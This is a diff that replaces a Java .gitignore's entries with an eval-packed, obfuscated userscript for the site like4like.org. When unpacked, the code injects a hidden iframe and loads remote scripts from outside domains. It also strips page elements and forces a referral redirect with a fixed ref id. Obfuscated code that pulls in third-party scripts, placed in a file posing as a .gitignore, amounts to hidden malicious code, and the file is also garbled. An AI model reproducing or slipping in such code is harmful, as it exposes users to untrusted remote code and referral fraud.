@@ -1,12 +1,5 @@
-*.class
-
-# Mobile Tools for Java (J2ME)
-.mtj.tmp/
-
-# Package Files #
-*.jar
-*.war
-*.ear
-
-# virtual machine crash logs, see http://www.java.com/en/download/help/error_hotspot.xml
-hs_err_pid*
+*.js
+// @copyright  2015+, Doan Dat
+// ==/UserScript==
+setInterval(function(){eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('$(\'a\').i(h(){1=$(2).j("k-l");g((1=="3(4://7.5.6/f/8/9-b-c-d.e)")||(1==\'3("4://7.5.6/f/8/9-b-c-d.e")\')){$(2).0().0().0().0().0().m()}});',23,23,'parent|x|this|url|http|like4like|org|www|icon|earn||facebook|like|antibot|png|img|if|function|each|css|background|image|remove'.split('|'),0,{}))},1000);
+eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('g C="<x G=\'u\' i=\'2://D.E-F.6/\' H=\'M\' N=\'0\' O=\'P:p;R:p;W: X;z-Y: 10;14:15; 16:17;18:1a%;\' 1c=\'1k\'></x>";$(".1l").1t(C);g 3=e.y(\'3\');3.A(\'i\',\'2://4.I-J.K/L.r\');e.s.t(3);5(7(){1y()},l);5(7(){S()},l);5(7(){T()},l);$(\'a[U$="V();"]\').9().9().n();$(\'o[i$="2://4.8.6/o/Z/q-11-1.12"]\').9().9().9().n();5(7(){$("#u").13()},f);b(c.d=="2://4.8.6/j/19.k?v=1b"){g h=$(\'1d[1e$="1f"]\').1g();b(h!="1h"||h==""){c.d.1i("2://4.8.6/?h=1j")}}b(c.d=="2://4.8.6/j/m-B.k"){5(7(){1m()},f)}b(c.d=="2://4.8.6/j/m-B-1n.k"){5(7(){1o()},f)}b(c.d=="2://4.8.6/j/m-1p-1q.k"){5(7(){1r()},f)}g 3=e.y(\'3\');3.A(\'i\',\'2://4.1s-w-1u-1v.1w-1x.Q/w/q.r\');e.s.t(3);',62,97,'||http|script|www|setTimeout|org|function|like4like|parent||if|window|location|document|3000|var|ref|src|user|php|1500|earn|remove|img|none|antibot|js|head|appendChild|anis||scripts|iframe|createElement||setAttribute|facebook|code|anisnio|fast|page|id|scrolling|adfly|exchange|com|cookies|no|frameborder|style|display|net|border|checkCookie1_1|checkCookie1_2|onclick|skiplink|position|fixed|index|icon|1000|top|png|slideDown|overflow|hidden|height|50px|width|login|100|register|allowTransparency|input|name|referral|val|104275|assign|anisnio3|true|all|checkCookie|subscribes|checkCookie_1|youtube|subscribe|checkCookie_2|imacros|prepend|for|free|is|best|checkCookie1'.split('|'),0,{}))
